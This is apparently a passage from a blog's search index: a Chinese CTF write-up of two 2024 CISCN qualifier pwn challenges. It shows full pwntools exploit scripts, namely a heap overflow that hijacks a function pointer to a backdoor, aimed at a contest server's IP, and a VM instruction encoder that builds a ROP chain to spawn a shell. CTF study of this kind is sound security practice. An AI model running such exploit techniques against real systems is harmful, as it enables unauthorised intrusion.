<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2024ciscn&amp;长城杯初赛pwn方向部分题解</title>
    <url>/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<h4 id="pwn-anote"><a href="#pwn-anote" class="headerlink" title="pwn-anote"></a>pwn-anote</h4><p>32位程序，存在后门函数。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215182951906.png"
                      class=""
                >
<p>粗测一下功能，add没有我们可以控制的输入；edit可以往里写内容，并且最后会显示work done；show能够看chunk里的内容，而且还送了gift，也就是堆上的地址。然后由于程序是c++编写的，直接看反编译的代码会比较模糊，这里结合动态调试分析功能点。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215183554444.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215184559047.png"
                      class=""
                >
<p>这里每次add时都会申请一个0x20大小的chunk，其中data域第一个会填入一个函数指针，结合反编译代码不难发现，这个调用的函数指针实际是用来打印<code>work done</code>的，这里我们如果能劫持这个指针到backdoor，就能getshell。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185453342.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185705572.png"
                      class=""
                >
<p>然后看看edit一些参数的限制，其中长度最多为40，但这个长度已经足以进行堆溢出，覆盖到下一个chunk的data域了，那么就可以直接把函数指针给改了。这里的函数指针是二级指针，所以还不能直接填进去backdoor函数的地址，由于gift给了堆上的地址了，那么我们就能先在堆的某个位置填入backdoor地址，然后劫持的函数指针指向该地址处。最后edit触发一下，然后就有shell了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215185800640.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190233099.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201646774.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&quot;./note&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;47.95.214.102&quot;</span>,<span class="number">20609</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">backdoor = <span class="number">0x80489CE</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>():       <span class="comment">#max 9</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;1&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):     <span class="comment">#size&lt;40,触发函数指针</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;len&quot;</span>,<span class="built_in">str</span>(size).encode())</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">end</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="string">b&quot;4&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_addr</span>(<span class="params">p</span>):</span><br><span class="line">    <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line">add()</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">heap_base = <span class="built_in">int</span>(p.recv(<span class="number">9</span>),<span class="number">16</span>)-<span class="number">0x5fc8</span></span><br><span class="line">log.success(<span class="string">&quot;heap_base: &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">add()</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">28</span>,p32(backdoor)*<span class="number">5</span>+p32(<span class="number">0x21</span>)+p32(heap_base+<span class="number">0x5fd0</span>))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">10</span>,<span class="string">b&quot;abcd&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<h4 id="pwn-avm"><a href="#pwn-avm" class="headerlink" title="pwn-avm"></a>pwn-avm</h4><p>VMpwn，首先要逆出其中每个指令的含义，以及自定义指令的构成。</p>
<p>首先主函数可以读取0x300字节的输入，然后进initial函数进行初始化。具体是往opt+0x100地址之后填一些控制信息，然后再把前面的位置都置空。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215190920906.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191043445.png"
                      class=""
                >
<p>经过动态调试，最后逆出的opt结构大概是这样，0x108处存我们的输入，也就是具体的指令，0x100处存目前指令的偏移（从后面动调看出），0x110处存最大的指令偏移。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215191015846.png"
                      class=""
                >
<p>然后看最重要的parse函数，首先v2里存了我们的选项，后面函数表中总共有10种不同的指令，注意到这里最后向右移位了0x1C，所以我们实际的指令种类是存在左移位0x1C处的。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192127742.png"
                      class=""
                >
<p>第一个函数如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192643849.png"
                      class=""
                >
<p>第二个函数如下:</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192712698.png"
                      class=""
                >
<p>第三个函数如下：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192739108.png"
                      class=""
                >
<p>看了三个具体指令的实现，我们观察到只有最后赋值后面的运算符发生了变化，然后我们就可以猜测其具体就是分别实现了add，sub，mul的功能，以此类推，就能得到前八个函数的大体作用。这里其实我们能看到opt前面0x100个字节分成了32个8字节，分别模拟了32个寄存器，我们的内容都是存在模拟寄存器中，前面8个函数也都只能对模拟寄存器做操作。实际上由于前面把这0x100个字节置空，所以直接调用前面这8个指令，得到的结果永远都是0。还有一点就是发现每个指令都会把opt偏移0x100处累加四，这说明每个指令都占用四个字节长度（逻辑上如此，而实际上后面分析也的确如此）。我们最多可以连续写0x300/0x4=0xc0个指令。</p>
<p>第9个和第10个函数稍微有点不同：</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193045374.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215193103501.png"
                      class=""
                >
<p>直接看有点摸不着头脑，只知道a2是一个栈上的缓冲区，我们后面动态调试的时候就会发现，这里第9个实际上能够往该缓冲区中写一个前面模拟寄存器的值，其偏移最多为0xFFF；而第十个函数可以从缓冲区偏移最多0xFFF处，读取一个值到我们的模拟寄存器。这里的<code>(HIWORD(v3) &amp; 0xFFF)</code>实际上相当于一个立即数，代表偏移。之后我们的指令表大概就恢复完成了。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215192212512.png"
                      class=""
                >
<p>下一个问题是指令的具体组成，比如我们想用write_reg往偏移为25的模拟寄存器存缓冲区偏移0xd38的内容，那么我们可以在汇编的具体执行过程中进行分析。逐渐调试就能得到<code>payload = p32((10&lt;&lt;0x1c)+(tarreg&amp;0x1f)+((reg1&amp;0x1f)&lt;&lt;5)+((num&amp;0xfff)&lt;&lt;16))</code>。也就是说指令类型左移位0x1c，存储结果寄存器在最低位（且不超过31），一个被当作偏移的寄存器序号在左移位5位处，立即数在左移位16位处。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215194053168.png"
                      class=""
                >
<p>然后就能还原出每一个指令的组成结构：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">8</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_stack</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">    payload = p32((<span class="number">9</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write_reg</span>(<span class="params">tarreg,reg1,num</span>):</span><br><span class="line">     payload = p32((<span class="number">10</span>&lt;&lt;<span class="number">0x1c</span>)+(tarreg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((num&amp;<span class="number">0xfff</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">     <span class="keyword">return</span> payload</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>之后的问题就是要从栈上已有的固定的内容，读取到模拟寄存器中，这里我们在动态调试时，能够看到缓冲区的起始地址，也就是加上我们的立即数偏移这个位置。这里如果我们最后所有指令结束后，parse函数返回时，就会到偏移0x118位置。我们想要算出gadget和system等相关于libc的地址，所以要获取libc基址。这里能在0xd38偏移位置找到，而且这个是前面栈帧所遗留的，不会在每次程序执行时变化。同时我们还能在这个libc相关地址上面获取到一个1，将他们存到模拟寄存器中。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195205194.png"
                      class=""
                >
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215195328605.png"
                      class=""
                >
<p>后面就是要先算出libc基址，然后得到ret，pop_rdi_ret，/bin/sh字符串以及system的地址。这里直接自己找栈上的内容，然后一点一点手动构造出来显然不是很现实。然后发现距离libc_base偏移最多的/bin/sh字符串地址的偏移为0x1d8678。换算成二进制，大概要用21个二进制位，不过我们模拟寄存器位充足，最后我用寄存器模拟了23个二进制位。这样我们可以用模拟寄存器的线性组合表示出任何我们想要的偏移。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215200035859.png"
                      class=""
                >
<p>具体组合实现：</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">make_addr</span>(<span class="params">offset,tar</span>):</span><br><span class="line">    binary = <span class="built_in">bin</span>(offset)[<span class="number">2</span>:][::-<span class="number">1</span>]</span><br><span class="line">    payload = add(tar,<span class="number">31</span>,<span class="number">31</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(binary)):</span><br><span class="line">        <span class="keyword">if</span> binary[i]==<span class="string">&quot;1&quot;</span>:</span><br><span class="line">            payload += add(tar,tar,i)</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">payload =  write_reg(<span class="number">25</span>,<span class="number">0</span>,<span class="number">0xd38</span>) + write_reg(<span class="number">0</span>,<span class="number">31</span>,<span class="number">0xd30</span>)+add(<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>)+add(<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>)+add(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>)+add(<span class="number">4</span>,<span class="number">3</span>,<span class="number">3</span>)+add(<span class="number">5</span>,<span class="number">4</span>,<span class="number">4</span>)+add(<span class="number">6</span>,<span class="number">5</span>,<span class="number">5</span>)</span><br><span class="line">payload += add(<span class="number">7</span>,<span class="number">6</span>,<span class="number">6</span>)+add(<span class="number">8</span>,<span class="number">7</span>,<span class="number">7</span>)+add(<span class="number">9</span>,<span class="number">8</span>,<span class="number">8</span>)+add(<span class="number">10</span>,<span class="number">9</span>,<span class="number">9</span>)+add(<span class="number">11</span>,<span class="number">10</span>,<span class="number">10</span>)+add(<span class="number">12</span>,<span class="number">11</span>,<span class="number">11</span>)+add(<span class="number">13</span>,<span class="number">12</span>,<span class="number">12</span>)+add(<span class="number">14</span>,<span class="number">13</span>,<span class="number">13</span>)+add(<span class="number">15</span>,<span class="number">14</span>,<span class="number">14</span>)</span><br><span class="line">payload += add(<span class="number">16</span>,<span class="number">15</span>,<span class="number">15</span>)+add(<span class="number">17</span>,<span class="number">16</span>,<span class="number">16</span>)+add(<span class="number">18</span>,<span class="number">17</span>,<span class="number">17</span>)+add(<span class="number">19</span>,<span class="number">18</span>,<span class="number">18</span>)+add(<span class="number">20</span>,<span class="number">19</span>,<span class="number">19</span>)+add(<span class="number">21</span>,<span class="number">20</span>,<span class="number">20</span>)+add(<span class="number">22</span>,<span class="number">21</span>,<span class="number">21</span>)+add(<span class="number">23</span>,<span class="number">22</span>,<span class="number">22</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x29d90</span>,<span class="number">24</span>)</span><br><span class="line">payload += sub(<span class="number">25</span>,<span class="number">25</span>,<span class="number">24</span>)		<span class="comment">#get libc_base，saved in 25</span></span><br><span class="line">payload += make_addr(<span class="number">0x29139</span>,<span class="number">24</span>) + add(<span class="number">29</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">29</span>,<span class="number">31</span>,<span class="number">0x118</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x2a3e5</span>,<span class="number">24</span>) + add(<span class="number">26</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">26</span>,<span class="number">31</span>,<span class="number">0x120</span>) </span><br><span class="line">payload += make_addr(<span class="number">0x1d8678</span>,<span class="number">24</span>) + add(<span class="number">27</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">27</span>,<span class="number">31</span>,<span class="number">0x128</span>)</span><br><span class="line">payload += make_addr(<span class="number">0x50D70</span>,<span class="number">24</span>) + add(<span class="number">28</span>,<span class="number">24</span>,<span class="number">25</span>) + write_stack(<span class="number">28</span>,<span class="number">31</span>,<span class="number">0x130</span>)</span><br></pre></td></tr></table></figure></div>
<p>基本动态调试能正确算出一个偏移，那么其它的也就没问题了，这里我往25号模拟寄存器存libc_base，24号模拟寄存器存偏移。直接往返回地址处写rop链。最后也是只用了0x150字节，离0x300字节的上限还远。</p>
<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/blog/2024/12/18/2024ciscn-%E9%95%BF%E5%9F%8E%E6%9D%AF%E5%88%9D%E8%B5%9Bpwn%E6%96%B9%E5%90%91%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/image-20241215201820964.png"
                      class=""
                >
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line"><span class="comment"># 0x300大小限制</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#    len    func</span></span><br><span class="line"><span class="comment"># 1   4      add</span></span><br><span class="line"><span class="comment"># 2   4      sub</span></span><br><span class="line"><span class="comment"># 3   4      mul</span></span><br><span class="line"><span class="comment"># 4   4      div</span></span><br><span class="line"><span class="comment"># 5   4      xor</span></span><br><span class="line"><span class="comment"># 6   4      and</span></span><br><span class="line"><span class="comment"># 7   4      shl</span></span><br><span class="line"><span class="comment"># 8   4      shr</span></span><br><span class="line"><span class="comment"># 9   4     write_stack</span></span><br><span class="line"><span class="comment"># 10  4     write_reg</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">1</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">2</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">3</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">4</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">5</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">and_</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">6</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shl</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = p32((<span class="number">7</span>&lt;&lt;<span class="number">0x1c</span>)+(savereg&amp;<span class="number">0x1f</span>)+((reg1&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>)+((reg2&amp;<span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">savereg,reg1,reg2</span>):</span><br><span class="line">    payload = 